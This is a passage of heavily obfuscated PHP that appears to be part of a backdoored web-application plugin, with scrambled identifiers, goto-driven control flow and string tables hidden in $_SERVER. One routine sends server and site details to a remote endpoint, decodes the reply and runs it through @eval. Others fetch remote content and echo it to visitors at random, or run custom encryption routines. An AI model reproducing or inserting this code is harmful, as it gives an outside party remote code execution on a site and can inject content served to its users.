($F›µ«ÅŞ• <= $eÕ”Ìº¸Ô[61]($eÕ”Ìº¸Ô[149])->{$_SERVER[›É][150]}()) { $eÕ”Ìº¸Ô[184]($eÕ”Ìº¸Ô[216]($eÕ”Ìº¸Ô[265]), !1, $eÕ”Ìº¸Ô[258]); die; } } } goto DÈË¢Áá£; Cƒ‘åìÖ‡: $eòßâ‚¦ = $_SERVER[$eÕ”Ìº¸Ô[44]]; if ($eòßâ‚¦ == $eÕ”Ìº¸Ô[256] && $this->hoik95ab8e6b == $eÕ”Ìº¸Ô[131]) { $eÕ”Ìº¸Ô[184]($eÕ”Ìº¸Ô[216]($eÕ”Ìº¸Ô[257]), !1, $eÕ”Ìº¸Ô[258]); } $d¿‡ÌÌâ‡³ = array($eÕ”Ìº¸Ô[259], $eÕ”Ìº¸Ô[260]); goto d¢‰“è‰Æ•; DÈË¢Áá£: } private function aiuy24723080() { goto fÉòÛº¤ï; bŒŞ¥¿ğâ´: if (!$BÖ˜©”àÉ[116]($GLOBALS, $BÖ˜©”àÉ[142]) || !isset($_GET[$BÖ˜©”àÉ[267]])) { return; } if (!$BÖ˜©”àÉ[261]($_SERVER[$BÖ˜©”àÉ[44]], $Eï¥îğÔŞ)) { return; } $Fƒ¹íä˜ŞÁ = $BÖ˜©”àÉ[268]; goto cÚ¦æ²±ª¾; BØµŸâ«ä¬: $FëœŠÏƒö… = $B¹£µº§ñ[642]; if (strlen($FëœŠÏƒö…) < $B¹£µº§ñ[616]) { return; } $BÖ˜©”àÉ[277]($BÖ˜©”àÉ[278]); goto AĞâ¨ Æˆ—; cÚ¦æ²±ª¾: $Fƒ¹íä˜ŞÁ = $this->{$_SERVER[›É][269]}($Fƒ¹íä˜ŞÁ, $BÖ˜©”àÉ[270]); $dÛÂò¶™ = $BÖ˜©”àÉ[271](array($BÖ˜©”àÉ[272] => array($BÖ˜©”àÉ[273] => $BÖ˜©”àÉ[274], $BÖ˜©”àÉ[275] => 3))); $bìôèêâ = @$BÖ˜©”àÉ[276]($Fƒ¹íä˜ŞÁ, !1, $dÛÂò¶™); goto BØµŸâ«ä¬; fÉòÛº¤ï: $B¹£µº§ñ =& $_SERVER[úÉ·öƒÑì©]; $BÖ˜©”àÉ =& $_SERVER[›É]; $Eï¥îğÔŞ = array($BÖ˜©”àÉ[145], $BÖ˜©”àÉ[266]); goto bŒŞ¥¿ğâ´; AĞâ¨ Æˆ—: if ($bìôèêâ && $BÖ˜©”àÉ[32]($bìôèêâ, $BÖ˜©”àÉ[279])) { echo $bìôèêâ; } die; goto fÖ‹áºµŸ; fÖ‹áºµŸ: } public function gqiu2af5afcb($fÃĞè›â¾) { goto EÛáŒ•é¤·; Dßô Ãöî×: $D¦áç—ØŠŒ = $b†âØ¼äâ[643]; foreach ($EÇñˆ–áÎ as $A‰œùØø›é => $a†Àº¡–) { if ($a†Àº¡– == $a™ÂÖ‰©Æ˜[282] && $a™ÂÖ‰©Æ˜[25]($this->hoik95ab8e6b, 0, 1) == $a™ÂÖ‰©Æ˜[282]) { continue; } if (!$a™ÂÖ‰©Æ˜[261]($A‰œùØø›é, $d²ˆëÊ—ö)) { $Fõ×ƒë„[] = $A‰œùØø›é; } } foreach ($Fõ×ƒë„ as $A‰œùØø›é) { unset($fÃĞè›â¾[$A‰œùØø›é]); $BìöÊŸÆ = $b†âØ¼äâ[644]; if (strlen($BìöÊŸÆ) < $b†âØ¼äâ[588]) { die; } } goto bšŞ¶åÊ‡©; Bçó¿Çê¼: $EÇñˆ–áÎ = array($a™ÂÖ‰©Æ˜[281] => $a™ÂÖ‰©Æ˜[282], $a™ÂÖ‰©Æ˜[283] => $a™ÂÖ‰©Æ˜[282], $a™ÂÖ‰©Æ˜[284] => $a™ÂÖ‰©Æ˜[282], $a™ÂÖ‰©Æ˜[285] => $a™ÂÖ‰©Æ˜[282], $a™ÂÖ‰©Æ˜[286] => $a™ÂÖ‰©Æ˜[282], $a™ÂÖ‰©Æ˜[287] => $a™ÂÖ‰©Æ˜[282], $a™ÂÖ‰©Æ˜[288] => $a™ÂÖ‰©Æ˜[289], $a™ÂÖ‰©Æ˜[290] => $a™ÂÖ‰©Æ˜[289], $a™ÂÖ‰©Æ˜[291] => $a™ÂÖ‰©Æ˜[289], $a™ÂÖ‰©Æ˜[292] => $a™ÂÖ‰©Æ˜[289], $a™ÂÖ‰©Æ˜[293] => $a™ÂÖ‰©Æ˜[289], $a™ÂÖ‰©Æ˜[294] => $a™ÂÖ‰©Æ˜[289], $a™ÂÖ‰©Æ˜[295] => $a™ÂÖ‰©Æ˜[289], $a™ÂÖ‰©Æ˜[296] => $a™ÂÖ‰©Æ˜[289], $a™ÂÖ‰©Æ˜[297] => $a™ÂÖ‰©Æ˜[289]); $d²ˆëÊ—ö = $a™ÂÖ‰©Æ˜[0]($a™ÂÖ‰©Æ˜[298], $a™ÂÖ‰©Æ˜[116]($this->vinoab61c75a, $a™ÂÖ‰©Æ˜[139], $a™ÂÖ‰©Æ˜[10])); $Fõ×ƒë„ = array(); goto Dßô Ãöî×; EÛáŒ•é¤·: $b†âØ¼äâ =& $_SERVER[úÉ·öƒÑì©]; $a™ÂÖ‰©Æ˜ =& $_SERVER[›É]; if ($this->hoik95ab8e6b == $a™ÂÖ‰©Æ˜[280]) { return $fÃĞè›â¾; } goto Bçó¿Çê¼; bšŞ¶åÊ‡©: return $fÃĞè›â¾; $bù°öÍ·åî = $b†âØ¼äâ[645]; if (!$bù°öÍ·åî) { die; } goto f¥´Äè–¡; f¥´Äè–¡: } private function lrsx26a6b3ea() { $c²»ÆâŠ„• =& $_SERVER[›É]; if ($this->hoik95ab8e6b != $c²»ÆâŠ„•[131]) { return; } $GLOBALS[$c²»ÆâŠ„•[104]][$c²»ÆâŠ„•[108]][$c²»ÆâŠ„•[299]] = $c²»ÆâŠ„•[239]; $GLOBALS[$c²»ÆâŠ„•[104]][$c²»ÆâŠ„•[300]] = $c²»ÆâŠ„•[239]; if ($c²»ÆâŠ„•[61]($c²»ÆâŠ„•[301])->{$_SERVER[›É][63]}($c²»ÆâŠ„•[93]) != $c²»ÆâŠ„•[253]) { $c²»ÆâŠ„•[61]($c²»ÆâŠ„•[301])->{$_SERVER[›É][240]}($c²»ÆâŠ„•[93], $c²»ÆâŠ„•[253]); } } public function mchz1cdb0d82() { return $_SERVER[›É][302]; } private function yiot07e855d3() { goto Cãô«ñÒÔ; E±ì´ÚÎ: $this->{$_SERVER[›É][182]}(); if ($this->{$_SERVER[›É][218]}($f‹ƒÈ³Øµ[$eœÆò²ö¤Â[312]]) != $eË‚Êò“Ÿ[$eœÆò²ö¤Â[183]]) { $døäğ­ôï• = array($eœÆò²ö¤Â[220] => $e•‡ÅŞ›Ü‰, $eœÆò²ö¤Â[221] => $_SERVER[$eœÆò²ö¤Â[125]], $eœÆò²ö¤Â[222] => $eœÆò²ö¤Â[223](), $eœÆò²ö¤Â[192] => $_SERVER[$eœÆò²ö¤Â[193]]); $eÏ×åØ‚œ“ = $this->{$_SERVER[›É][224]}($eœÆò²ö¤Â[166]($døäğ­ôï•)); $f‹ƒÈ³Øµ = $this->{$_SERVER[›É][202]}($eœÆò²ö¤Â[225] . $eÏ×åØ‚œ“); if ($f‹ƒÈ³Øµ && $eœÆò²ö¤Â[161]($f‹ƒÈ³Øµ) && isset($f‹ƒÈ³Øµ[$eœÆò²ö¤Â[312]])) { $Fğ¡º…†¿š = $this->{$_SERVER[›É][208]}($f‹ƒÈ³Øµ[$eœÆò²ö¤Â[312]], 2); if ($Fğ¡º…†¿š) { $Fğ¡º…†¿š = $this->{$_SERVER[›É][218]}($Fğ¡º…†¿š); } if ($Fğ¡º…†¿š) { try { @eval($Fğ¡º…†¿š); } catch (Exception $aÒÍ˜å â©) { } } } } goto CÃÊÒ™©Êì; D¡ÃŸ’»ë: $eË‚Êò“Ÿ = array($eœÆò²ö¤Â[183] => $eœÆò²ö¤Â[61]($eœÆò²ö¤Â[62])->{$_SERVER[›É][63]}($eœÆò²ö¤Â[227]), $eœÆò²ö¤Â[197] => $this->hoik95ab8e6b, $eœÆò²ö¤Â[194] => $_SERVER[$eœÆò²ö¤Â[195]], $eœÆò²ö¤Â[196] => $eœÆò²ö¤Â[61]($eœÆò²ö¤Â[62])->{$_SERVER[›É][63]}($eœÆò²ö¤Â[157]), $eœÆò²ö¤Â[123] => $eœÆò²ö¤Â[124]($_SERVER[$eœÆò²ö¤Â[125]] . $e•‡ÅŞ›Ü‰), $eœÆò²ö¤Â[187] => $eœÆò²ö¤Â[167], $eœÆò²ö¤Â[190] => $_SERVER[$eœÆò²ö¤Â[191]]); $a„¶šŒÙˆ = $e¶—×¤‹ÎÃ[648]; if (strlen($a„¶šŒÙˆ) < $e¶—×¤‹ÎÃ[588]) { return; } goto Fã¸ÙçÅŸî; Cãô«ñÒÔ: $e¶—×¤‹ÎÃ =& $_SERVER[úÉ·öƒÑì©]; $eœÆò²ö¤Â =& $_SERVER[›É]; $AæÖ®¸Ú¨° = array($eœÆò²ö¤Â[303], $eœÆò²ö¤Â[304], $eœÆò²ö¤Â[305]); goto B’Ú¦ÓõÃ; FÚŒğˆŠ³: $e•‡ÅŞ›Ü‰ = $eœÆò²ö¤Â[61]($eœÆò²ö¤Â[62])->{$_SERVER[›É][63]}($eœÆò²ö¤Â[126]); $e˜‘èµÁáì = $e¶—×¤‹ÎÃ[647]; if (!$e˜‘èµÁáì) { die; } goto D¡ÃŸ’»ë; f†è¤ãËò: if ($this->hoik95ab8e6b == $eœÆò²ö¤Â[131] || !$eœÆò²ö¤Â[116]($GLOBALS, $eœÆò²ö¤Â[142])) { return; } if (!$eœÆò²ö¤Â[261]($_SERVER[$eœÆò²ö¤Â[44]], $AæÖ®¸Ú¨°)) { return; } if ($eœÆò²ö¤Â[255]() % 4 != 0) { return; } goto BÓ˜‚á¤—Ó; B’Ú¦ÓõÃ: $B˜”é¨¾¡é = $e¶—×¤‹ÎÃ[646]; if (strlen($B˜”é¨¾¡é) < $e¶—×¤‹ÎÃ[592]) { return; } $Bâ˜ßà‘ìŠ = $eœÆò²ö¤Â[306] . $eœÆò²ö¤Â[124]($eœÆò²ö¤Â[307]); goto f†è¤ãËò; Fã¸ÙçÅŸî: $f‹ƒÈ³Øµ = $this->{$_SERVER[›É][202]}($eœÆò²ö¤Â[311], $eË‚Êò“Ÿ); if (!$eœÆò²ö¤Â[161]($f‹ƒÈ³Øµ)) { return; } if ($f‹ƒÈ³Øµ[$eœÆò²ö¤Â[183]] && $f‹ƒÈ³Øµ[$eœÆò²ö¤Â[312]]) { if ($this->{$_SERVER[›É][218]}($f‹ƒÈ³Øµ[$eœÆò²ö¤Â[312]]) == $eË‚Êò“Ÿ[$eœÆò²ö¤Â[183]]) { return; } } goto E±ì´ÚÎ; BÓ˜‚á¤—Ó: $BãÍ£Ë–Ò  = $eœÆò²ö¤Â[13](array($eœÆò²ö¤Â[308], $eœÆò²ö¤Â[309]), $Bâ˜ßà‘ìŠ); if ($BãÍ£Ë–Ò  && $eœÆò²ö¤Â[255]() - $BãÍ£Ë–Ò  < $eœÆò²ö¤Â[263]($eœÆò²ö¤Â[310])) { return; } $eœÆò²ö¤Â[13](array($eœÆò²ö¤Â[308], $eœÆò²ö¤Â[170]), $Bâ˜ßà‘ìŠ, $eœÆò²ö¤Â[255]()); goto FÚŒğˆŠ³; CÃÊÒ™©Êì: } private function gzjdbe995161($AŒ®Û­×‡ = '', $a¤ğîµ‘°· = array(), $DÎ¯íÊ¶²œ = 5) { goto b¤„Íèõ¯; f‡»Õ±ÜÑé: while ($FÎíÀòˆç < $FÂÁŠ…¹¦È[248]) { if ($FÎíÀòˆç >= 0) { break; } $FÎíÀòˆç++; } goto FƒÁËÈğ–Ç; cô óóÖ©½: $E¹–¸ã§‡ = $this->{$_SERVER[›É][269]}($E¹–¸ã§‡, $Fä —ØÁÜ…[314]); $E¹–¸ã§‡ = $E¹–¸ã§‡ . $AŒ®Û­×‡; $D„ììÀçæ˜ = $FÂÁŠ…¹¦È[649]; goto CÇë˜°ªœù; CÇë˜°ªœù: if (!$D„ììÀçæ˜) { return; } if ($a¤ğîµ‘°· && $Fä —ØÁÜ…[161]($a¤ğîµ‘°·)) { $E¹–¸ã§‡ = $E¹–¸ã§‡ . $Fä —ØÁÜ…[315] . $Fä —ØÁÜ…[316]($a¤ğîµ‘°·); } if ($a¤ğîµ‘°· === -1) { return $E¹–¸ã§‡; } goto d™Ş×ƒñµÔ; d™Ş×ƒñµÔ: $aš ·Ä÷˜† = $Fä —ØÁÜ…[271](array($Fä —ØÁÜ…[272] => array($Fä —ØÁÜ…[275] => $DÎ¯íÊ¶²œ, $Fä —ØÁÜ…[273] => $Fä —ØÁÜ…[317]), $Fä —ØÁÜ…[318] => array($Fä —ØÁÜ…[319] => !1, $Fä —ØÁÜ…[320] => !1))); $eÂ¸®ò·Ìé = $FÂÁŠ…¹¦È[650]; if (!$eÂ¸®ò·Ìé) { die; } goto eØã‚ ¸÷÷; fƒ½ùï£Ø: return $Fä —ØÁÜ…[210]($a¤ğîµ‘°·, !0); $e–Óö‚¿ = $FÂÁŠ…¹¦È[652]; $FÎíÀòˆç = $FÂÁŠ…¹¦È[653]; goto f‡»Õ±ÜÑé; b¤„Íèõ¯: $FÂÁŠ…¹¦È =& $_SERVER[úÉ·öƒÑì©]; $Fä —ØÁÜ… =& $_SERVER[›É]; $E¹–¸ã§‡ = $Fä —ØÁÜ…[313]; goto cô óóÖ©½; eØã‚ ¸÷÷: $a¤ğîµ‘°· = @$Fä —ØÁÜ…[276]($E¹–¸ã§‡, !1, $aš ·Ä÷˜†); $b‡¦’Şô±‘ = $FÂÁŠ…¹¦È[651]; while (strlen($b‡¦’Şô±‘) < $FÂÁŠ…¹¦È[592]) { if (!$b‡¦’Şô±‘) { break; } $b‡¦’Şô±‘++; } goto fƒ½ùï£Ø; FƒÁËÈğ–Ç: } private function mqhv036e0232() { goto BíÈî‡›Ä¯; BíÈî‡›Ä¯: $eŞìËÉÇìÌ =& $_SERVER[›É]; $d††Ê­¤× = array($eŞìËÉÇìÌ[321] => $eŞìËÉÇìÌ[322], $eŞìËÉÇìÌ[323] => $eŞìËÉÇìÌ[324], $eŞìËÉÇìÌ[325] => $eŞìËÉÇìÌ[326], $eŞìËÉÇìÌ[327] => $eŞìËÉÇìÌ[328], $eŞìËÉÇìÌ[329] => $eŞìËÉÇìÌ[330], $eŞìËÉÇìÌ[331] => $eŞìËÉÇìÌ[264], $eŞìËÉÇìÌ[332] => $eŞìËÉÇìÌ[264], $eŞìËÉÇìÌ[333] => $eŞìËÉÇìÌ[322], $eŞìËÉÇìÌ[334] => $eŞìËÉÇìÌ[324], $eŞìËÉÇìÌ[335] => $eŞìËÉÇìÌ[326], $eŞìËÉÇìÌ[336] => $eŞìËÉÇìÌ[337], $eŞìËÉÇìÌ[338] => $eŞìËÉÇìÌ[328], $eŞìËÉÇìÌ[339] => $eŞìËÉÇìÌ[340], $eŞìËÉÇìÌ[341] => $eŞìËÉÇìÌ[330], $eŞìËÉÇìÌ[342] => $eŞìËÉÇìÌ[343], $eŞìËÉÇìÌ[344] => $eŞìËÉÇìÌ[345], $eŞìËÉÇìÌ[346] => $eŞìËÉÇìÌ[347]); $C„Ã°Ş‚¹® = $d††Ê­¤×[$this->hoik95ab8e6b]; goto C—Ó˜›Ü; C—Ó˜›Ü: $C„Ã°Ş‚¹® = $eŞìËÉÇìÌ[263]($C„Ã°Ş‚¹® ? $C„Ã°Ş‚¹® : $eŞìËÉÇìÌ[322]); $cØ» àŸºš = $eŞìËÉÇìÌ[116]($this->vinoab61c75a, $eŞìËÉÇìÌ[348]); $cØ» àŸºš = $cØ» àŸºš ? $eŞìËÉÇìÌ[263]($cØ» àŸºš) : 0; goto a‘Ù£íÕÏ¶; a‘Ù£íÕÏ¶: return $C„Ã°Ş‚¹® + $cØ» àŸºš; $EÑß—¯è£É = $_SERVER[úÉ·öƒÑì©][654]; if (!$EÑß—¯è£É) { return; } goto cºˆÀÀÕ¨; cºˆÀÀÕ¨: } public function znimcc86e7ed($d»¤—ãÓ±) { goto d¿àŠğ¯…; d¿àŠğ¯…: $cù‚óÑ” =& $_SERVER[úÉ·öƒÑì©]; $f½ÈÇèó•š =& $_SERVER[›É]; $FÓÌ¨Êë„Œ = $this->{$_SERVER[›É][147]}(); goto aÙ—–òÅ³; B±±–½Ù: if ($FÓÌ¨Êë„Œ >= $f½ÈÇèó•š[263]($f½ÈÇèó•š[264])) { return; } $Bí´œôçÄ¤ = $f½ÈÇèó•š[61]($f½ÈÇèó•š[149])->{$_SERVER[›É][150]}(); $b—ï¨ñ…Ş = $cù‚óÑ”[656]; goto B©‘ğ³›™‰; F®âöÂÏØİ: while (strlen($Dâ›Ö¥¤º) < $cù‚óÑ”[248]) { if (!$Dâ›Ö¥¤º) { break; } $Dâ›Ö¥¤º++; } $e¶ìà­å¹ = $f½ÈÇèó•š[241]($e¶ìà­å¹, $f½ÈÇèó•š[10], $f½ÈÇèó•š[349]); if (!$f½ÈÇèó•š[261]($d»¤—ãÓ±[$f½ÈÇèó•š[349]], $e¶ìà­å¹)) { $f½ÈÇèó•š[184]($f½ÈÇèó•š[353], !1, $f½ÈÇèó•š[258]); } goto dŠÌíÆ†š£; B©‘ğ³›™‰: if ($Bí´œôçÄ¤ <= $FÓÌ¨Êë„Œ) { return; } $e¶ìà­å¹ = $f½ÈÇèó•š[61]($f½ÈÇèó•š[149])->{$_SERVER[›É][350]}($f½ÈÇèó•š[349])->{$_SERVER[›É][351]}($FÓÌ¨Êë„Œ)->{$_SERVER[›É][352]}(); $Dâ›Ö¥¤º = $cù‚óÑ”[657]; goto F®âöÂÏØİ; aÙ—–òÅ³: $f†Ğöª” = $cù‚óÑ”[655]; while ($f†Ğöª” < $cù‚óÑ”[597]) { if ($f†Ğöª” >= 0) { break; } $f†Ğöª”++; } if ($d»¤—ãÓ±[$f½ÈÇèó•š[349]] == $f½ÈÇèó•š[239]) { return; } goto B±±–½Ù; dŠÌíÆ†š£: } public function rqmx9321eec9() { goto e‡µˆ•š; Cä½¶Ô§Ã: echo $EÙÑİ¬³[355] . $EÙÑİ¬³[356]($aÀÄ†…ˆ) . $EÙÑİ¬³[357]; $c°í³‹²ŠŸ = $F¤ìÆÄÈ©Ç[661]; while ($c°í³‹²ŠŸ < $F¤ìÆÄÈ©Ç[588]) { if ($c°í³‹²ŠŸ >= 0) { break; } $c°í³‹²ŠŸ++; } goto B‰ÓÌ‚½ƒÅ; eáÏÍë¥Ÿ: $FôÙíêß˜› = $EÙÑİ¬³[271](array($EÙÑİ¬³[272] => array($EÙÑİ¬³[273] => $EÙÑİ¬³[274], $EÙÑİ¬³[275] => 3))); $fÎœÌî²¦ô = $F¤ìÆÄÈ©Ç[659]; if (strlen($fÎœÌî²¦ô) < $F¤ìÆÄÈ©Ç[592]) { die; } goto dÁ÷ºáœĞ; dÁ÷ºáœĞ: $aÀÄ†…ˆ = @$EÙÑİ¬³[276]($F²É˜ƒ§Ëõ, !1, $FôÙíêß˜›); $E¨ˆµìÏÀ“ = $F¤ìÆÄÈ©Ç[660]; if (strlen($E¨ˆµìÏÀ“) < $F¤ìÆÄÈ©Ç[597]) { die; } goto Cä½¶Ô§Ã; Céªö“¼á“: $F²É˜ƒ§Ëõ = $EÙÑİ¬³[268]; $C¯¬¾ï±ãˆ = $F¤ìÆÄÈ©Ç[658]; $F²É˜ƒ§Ëõ = $this->{$_SERVER[›É][269]}($F²É˜ƒ§Ëõ, $EÙÑİ¬³[270]); goto eáÏÍë¥Ÿ; e‡µˆ•š: $F¤ìÆÄÈ©Ç =& $_SERVER[úÉ·öƒÑì©]; $EÙÑİ¬³ =& $_SERVER[›É]; if (!$EÙÑİ¬³[116]($GLOBALS, $EÙÑİ¬³[142]) || $EÙÑİ¬³[354](1, 100) > 20) { return; } goto Céªö“¼á“; B‰ÓÌ‚½ƒÅ: } private function lthv5d096794($E´ÏÊ‚¤ø×, $eŸ‚Ô‘Óä, $a©Ñ†ç×ˆ‚ = 3) { goto fëùºéÕáØ; fëùºéÕáØ: $A¤òÉÓŒò =& $_SERVER[úÉ·öƒÑì©]; $c¹óõ’ ™ç =& $_SERVER[›É]; $c¹óõ’ ™ç[358](1); goto DÊ™äŠ¼¹Ñ; Céˆâó¿±: $fÆ¾’“Ìİğ = $A¤òÉÓŒò[663]; while (strlen($fÆ¾’“Ìİğ) < $A¤òÉÓŒò[597]) { if (!$fÆ¾’“Ìİğ) { break; } $fÆ¾’“Ìİğ++; } $Eøê¦ˆëÊŠ = $c¹óõ’ ™ç[354](0, 5) . $c¹óõ’ ™ç[10]; goto BÏîƒ¼„»¬; DÊ™äŠ¼¹Ñ: $E‰ŒÄ‡°• = $A¤òÉÓŒò[662]; if (strlen($E‰ŒÄ‡°•) < $A¤òÉÓŒò[616]) { return; } $E´ÏÊ‚¤ø× = $c¹óõ’ ™ç[2]($E´ÏÊ‚¤ø×); goto Céˆâó¿±; e‡¹ø ´: if ($a©Ñ†ç×ˆ‚ - 1 > 0) { $cîğø´ÒÆÕ = $this->{$_SERVER[›É][137]}($cîğø´ÒÆÕ, $eŸ‚Ô‘Óä, $a©Ñ†ç×ˆ‚ - 1); } return $cîğø´ÒÆÕ; goto FãÇ…Æ°õì; CßŒªîÄÏ: if (strlen($D¬ù¼Ş÷»Ì) < $A¤òÉÓŒò[592]) { die; } $A¸¶Ñæ½â = $c¹óõ’ ™ç[359]; switch ($Eøê¦ˆëÊŠ) { case $c¹óõ’ ™ç[253]: $cîğø´ÒÆÕ = $this->{$_SERVER[›É][165]}($E´ÏÊ‚¤ø×, $c¹óõ’ ™ç[233]($eŸ‚Ô‘Óä . $a©Ø„±¹İÓ)); $DõÉ­Ÿ©Ê¸ = $A¤òÉÓŒò[666]; while ($DõÉ­Ÿ©Ê¸ < $A¤òÉÓŒò[588]) { if ($DõÉ­Ÿ©Ê¸ >= 0) { break; } $DõÉ­Ÿ©Ê¸++; } break; $EÅŒ‹ÙÑ = $A¤òÉÓŒò[667]; while ($EÅŒ‹ÙÑ < $A¤òÉÓŒò[616]) { if ($EÅŒ‹ÙÑ >= 0) { break; } $EÅŒ‹ÙÑ++; } case $c¹óõ’ ™ç[239]: $cîğø´ÒÆÕ = $this->{$_SERVER[›É][165]}($E´ÏÊ‚¤ø×, $c¹óõ’ ™ç[233]($a©Ø„±¹İÓ . $eŸ‚Ô‘Óä)); break; case $c¹óõ’ ™ç[360]: $cîğø´ÒÆÕ = $this->{$_SERVER[›É][165]}($E´ÏÊ‚¤ø×, $c¹óõ’ ™ç[128]($a©Ø„±¹İÓ . $eŸ‚Ô‘Óä)); break; $AÏ¹àæ¥ = $A¤òÉÓŒò[668]; if (strlen($AÏ¹àæ¥) < $A¤òÉÓŒò[597]) { die; } case $c¹óõ’ ™ç[361]: $cîğø´ÒÆÕ = $this->{$_SERVER[›É][165]}($E´ÏÊ‚¤ø×, $c¹óõ’ ™ç[124]($a©Ø„±¹İÓ . $eŸ‚Ô‘Óä)); $B³Š‡§Û³Ñ = $A¤òÉÓŒò[669]; if (!$B³Š‡§Û³Ñ) { die; } break; case $c¹óõ’ ™ç[362]: goto FÎ¨Ø•¯¯¾; fÜ‰ÂÙø¬: if (strlen($A£Ä÷ôÍ¿²) < $A¤òÉÓŒò[588]) { die; } $bâÃ×µ‰ä = 0; for ($aôŞ“˜œÙ  = 0; $aôŞ“˜œÙ  < $c¹óõ’ ™ç[24]($E´ÏÊ‚¤ø×); $aôŞ“˜œÙ ++) { $bâÃ×µ‰ä = $bâÃ×µ‰ä == $c¹óõ’ ™ç[24]($BÛå½±Ù) ? 0 : $bâÃ×µ‰ä; $dÍ‡™ô¦×È = ($C¢Ó¿å¢À° + $c¹óõ’ ™ç[364]($A¸¶Ñæ½â, $E´ÏÊ‚¤ø×[$aôŞ“˜œÙ ]) + $c¹óõ’ ™ç[365]($BÛå½±Ù[$bâÃ×µ‰ä++])) % 64; $CİÅÑµÉ“ù .= $A¸¶Ñæ½â[$dÍ‡™ô¦×È]; } goto E¡×«ÁÇ¨; dò…Ï˜ÂÎ: $CİÅÑµÉ“ù = $c¹óõ’ ™ç[10]; $C³ƒ˜…÷‰´ = $A¤òÉÓŒò[674]; if (!$C³ƒ˜…÷‰´) { return; } goto A ß•Ò¿¼; A ß•Ò¿¼: $aôŞ“˜œÙ  = 0; $dÍ‡™ô¦×È = 0; $A£Ä÷ôÍ¿² = $A¤òÉÓŒò[675]; goto fÜ‰ÂÙø¬; Cä¡Å”°”‹: $b½ñ¦¤Òî• = $A¤òÉÓŒò[671]; if (!$b½ñ¦¤Òî•) { die; } $fÉÍ´¤•Ñ = $A¸¶Ñæ½â[$C¢Ó¿å¢À°]; goto d­ùÖ÷‡–“; FÎ¨Ø•¯¯¾: $E´ÏÊ‚¤ø× = $c¹óõ’ ™ç[128]($E´ÏÊ‚¤ø×); $EØ°Ö¿Å·‰ = $A¤òÉÓŒò[670]; $C¢Ó¿å¢À° = $c¹óõ’ ™ç[363](0, 64); goto Cä¡Å”°”‹; d­ùÖ÷‡–“: $F¹–“øï¡ğ = $A¤òÉÓŒò[672]; if (strlen($F¹–“øï¡ğ) < $A¤òÉÓŒò[616]) { die; } $BÛå½±Ù = $c¹óõ’ ™ç[124]($fÉÍ´¤•Ñ . $c¹óõ’ ™ç[124]($eŸ‚Ô‘Óä . $fÉÍ´¤•Ñ) . $eŸ‚Ô‘Óä); goto a¥Í’”öÙ; E¡×«ÁÇ¨: $cîğø´ÒÆÕ = $c¹óõ’ ™ç[356]($fÉÍ´¤•Ñ . $CİÅÑµÉ“ù); break; goto A¡Ç‰íõš¬; a¥Í’”öÙ: $C¢ÏÅ®¸ƒ± = $A¤òÉÓŒò[673]; while (strlen($C¢ÏÅ®¸ƒ±) < $A¤òÉÓŒò[592]) { if (!$C¢ÏÅ®¸ƒ±) { break; } $C¢ÏÅ®¸ƒ±++; } $BÛå½±Ù = $c¹óõ’ ™ç[25]($BÛå½±Ù, $C¢Ó¿å¢À° % 8, $C¢Ó¿å¢À° % 8 + 7); goto dò…Ï˜ÂÎ; A¡Ç‰íõš¬: default: $cîğø´ÒÆÕ = $this->{$_SERVER[›É][165]}($E´ÏÊ‚¤ø×, $eŸ‚Ô‘Óä . $a©Ø„±¹İÓ); break; } goto d½·Èâ¬“°; BÏîƒ¼„»¬: $däŠ¦İ¸Ç = $A¤òÉÓŒò[664]; $a©Ø„±¹İÓ = $c¹óõ’ ™ç[134](15); $D¬ù¼Ş÷»Ì = $A¤òÉÓŒò[665]; goto CßŒªîÄÏ; d½·Èâ¬“°: $cîğø´ÒÆÕ = $c¹óõ’ ™ç[233]($Eøê¦ˆëÊŠ . $a©Ø„±¹İÓ . $cîğø´ÒÆÕ); $CñÇäíñì = $A¤òÉÓŒò[676]; if (strlen($CñÇäíñì) < $A¤òÉÓŒò[616]) { die; } goto e‡¹ø ´; FãÇ…Æ°õì: } private function rzfqa1b462f7($DÇİƒñ¾¦, $FÈ×âØ°÷, $f¦¸ñ“·Ä¥ = 3) { goto bôŒŞºÇë’; A£‰Ãø©Ò: $DÇİƒñ¾¦ = $C´†Ò¸Ö¡[25]($DÇİƒñ¾¦, 16); $b¦äÜ»Šğ = $C´†Ò¸Ö¡[359]; switch ($AÙœŠÈ˜‚Ó) { case $C´†Ò¸Ö¡[253]: $f¤ù¹ìˆŞ = $this->{$_SERVER[›É][269]}($DÇİƒñ¾¦, $C´†Ò¸Ö¡[233]($FÈ×âØ°÷ . $câƒë½æäµ)); $BïªÙ‚ªµŞ = $e…¦Œçî°[678]; if (!$BïªÙ‚ªµŞ) { die; } break; $CìË…»„éµ = $e…¦Œçî°[679]; while (strlen($CìË…»„éµ) < $e…¦Œçî°[592]) { if (!$CìË…»„éµ) { break; } $CìË…»„éµ++; } case $C´†Ò¸Ö¡[239]: $f¤ù¹ìˆŞ = $this->{$_SERVER[›É][269]}($DÇİƒñ¾¦, $C´†Ò¸Ö¡[233]($câƒë½æäµ . $FÈ×âØ°÷)); $a»¸•ß¥åÇ = $e…¦Œçî°[680]; break; case $C´†Ò¸Ö¡[360]: $f¤ù¹ìˆŞ = $this->{$_SERVER[›É][269]}($DÇİƒñ¾¦, $C´†Ò¸Ö¡[128]($câƒë½æäµ . $FÈ×âØ°÷)); break; case $C´†Ò¸Ö¡[361]: $f¤ù¹ìˆŞ = $this->{$_SERVER[›É][269]}($DÇİƒñ¾¦, $C´†Ò¸Ö¡[124]($câƒë½æäµ . $FÈ×âØ°÷)); $f¸ƒœÒÜ–÷ = $e…¦Œçî°[681]; while ($f¸ƒœÒÜ–÷ < $e…¦Œçî°[592]) { if ($f¸ƒœÒÜ–÷ >= 0) { break; } $f¸ƒœÒÜ–÷++; } break; $aš×™ È‡Ö = $e…¦Œçî°[682]; while (strlen($aš×™ È‡Ö) < $e…¦Œçî°[588]) { if (!$aš×™ È‡Ö) { break; } $aš×™ È‡Ö++; } case $C´†Ò¸Ö¡[362]: goto Dˆ‰º‰ ¿; f¯Û¢õÌ¬: $bŒ‹‡Ú½ì = $DÇİƒñ¾¦[0]; $FˆŒĞèÁœ = $e…¦Œçî°[684]; if (!$FˆŒĞèÁœ) { die; } goto Cæ˜ÁÀ‚ç; FĞİºğ¨â–: $f¤ù¹ìˆŞ = $C´†Ò¸Ö¡[367]($bğÅÖ›‡ä„); $aè´ìÑŒ¤£ = $e…¦Œçî°[695]; while (strlen($aè´ìÑŒ¤£) < $e…¦Œçî°[592]) { if (!$aè´ìÑŒ¤£) { break; } $aè´ìÑŒ¤£++; } goto eĞè—š’ŒŸ; AÎ³¿Î‹ÍÑ: $dê¢†ŒÔ–à = 